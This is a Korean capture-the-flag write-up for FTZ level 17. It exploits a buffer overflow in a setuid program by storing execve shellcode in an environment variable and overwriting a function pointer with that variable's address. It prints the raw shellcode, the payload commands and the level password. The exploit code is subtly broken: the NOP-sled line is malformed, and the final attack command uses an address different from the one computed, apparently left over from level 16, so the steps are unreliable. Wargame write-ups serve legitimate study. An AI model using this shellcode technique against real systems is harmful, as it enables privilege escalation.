# FTZ Level17

#### ID : level17 PW: king poetic
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 
attackme 프로그램에 level18의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>

main()
{
      void printit(){
        printf("Hello there!\n");
      }
      main(){
        int crap;
        void (*call)()=printit;
        char buf[20];
        fgets(buf, 48, stdin);
        setreuid(3098, 3098);
        call();
      }
}
```
Level16과 매우 비슷한데 shell 함수만 없다. 그러므로 환경변수에 쉘 코드를 등록하는 방법을 이용할 것이다.

우리의 목적을 생각해보자.<br>
1. buf에서 *call까지 거리 구하기
2. 쉘 코드 환경변수 등록 후 주소 확인
3. *call 위치 쉘 코드 주소로 덮어 씌우기
3. 공격!

buf에서 *call까지의 거리는 level16과 동일하므로 40이다<br>
[ftz_level16.md 참고하기](https://github.com/white-bean/security-study/)

이제 쉘 코드를 등록하고 주소를 찾아보자.<br>
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80<br>

```export shellcode=$(python -c 'print "\n90"*20+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')```<br>
vi에디터를 이용해 쉘 코드의 주소값을 받아오는 코드를 작성한다.<br>
```vi shell.c```<br>
```c
#include <stdio.h>

int main()
{
    printf("%p\n", getenv("shellcode"));
    return 0;
}
```
```
gcc -o shell shell.c
./shell
```
만든 코드를 실행시키면 쉘 코드의 주소값을 알 수 있다.<br>
필자의 경우 0xbffffef4가 나왔다.<br>

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>
**"A"*(buf~call까지 거리)+(0xbffffef4)**<br>

**이제 페이로드를 작성해보자.**<br>
```(python -c 'print "A"*40+"\xf4\xfe\xff\xbf"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level18 Password is "~~". 라고 나올 것이다!!
